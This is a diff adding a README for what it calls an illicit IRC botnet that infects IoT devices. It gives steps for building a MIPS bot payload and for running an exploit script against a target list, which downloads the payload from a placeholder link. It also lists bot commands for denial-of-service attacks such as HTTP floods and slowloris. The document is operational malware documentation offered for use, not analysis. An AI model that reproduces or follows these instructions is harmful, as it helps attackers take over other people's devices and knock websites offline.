@@ -1,0 +1,23 @@
+The IRC botnet is an illicit project that uses iOT bots as a medium to launch network attacks.
+
+- Build the payload
+1. Change main.go IP
+2. set GOOS=linux
+3. set GOARCH=mipsle
+4. go build .
+
+-Loading bots
+1. cd sploit
+2. Replace iot.go 'http://ex.com/payload.mipsle' with a payload file download link built on top of
+3. type list.txt | go run iot.go auto
+
+You can use an IRC client such as mIRC to access the main (#test) channel.
+
+-Attack Commands
+.get sitelink thread spacing
+.post sitelink thread spacing
+.cfb sitelink thread spacing
+.slowloris sitelink thread spacing
+.geye sitelink thread spacing
+.stop
+.kill 
